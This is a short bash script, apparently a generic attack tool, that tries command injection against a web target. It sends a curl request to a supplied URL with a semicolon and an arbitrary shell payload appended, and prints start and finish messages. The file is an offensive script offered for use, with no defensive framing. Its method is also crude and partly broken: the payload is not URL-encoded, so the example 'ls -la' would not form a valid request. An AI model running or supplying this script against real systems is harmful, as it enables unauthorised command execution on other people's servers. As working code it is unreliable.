#!/bin/bash
# Command Injection - Injecting commands into a vulnerable parameter
# Options:
# <target_url> : URL with vulnerable parameter
# <payload> : Command injection payload

# Usage: command_injection.sh <target_url> <payload>
# Example script
# command_injection.sh "http://example.com/vuln.php?param=1" "ls -la"

# Ensure parameters are provided
if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <target_url> <payload>"
    exit 1
fi

TARGET_URL=$1
PAYLOAD=$2

echo "Starting command injection on $TARGET_URL with payload $PAYLOAD"

# Perform command injection
curl "$TARGET_URL;$PAYLOAD"

echo "Command injection completed."
